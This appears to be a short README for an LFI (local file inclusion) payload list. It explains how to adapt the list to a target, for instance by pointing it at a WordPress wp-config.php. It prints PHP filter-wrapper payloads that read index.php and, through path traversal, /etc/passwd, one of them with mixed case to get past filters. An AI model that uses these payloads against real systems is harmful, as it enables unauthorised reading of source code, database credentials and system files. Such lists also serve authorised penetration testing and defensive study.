# lfi.list
a big list of useful lfi paths


you might have to customise this list - for example if wordpress is located in /blog/ directory edit the top line of this file to /var/www/html/blog/wp-config.php

edit the file to include what file your searching for eg

grep resource /scripts/useful/lfi.list
      php://filter/read=string.rot13/resource=index.php
      php://filter/convert.base64-encode/resource=index.php
      pHp://FilTer/convert.base64-encode/resource=index.php
      php://filter/convert.base64-encode/resource=../../../../../etc/passwd

and possibly replace it with a resource you know, for example upload, if there is an /upload.php file
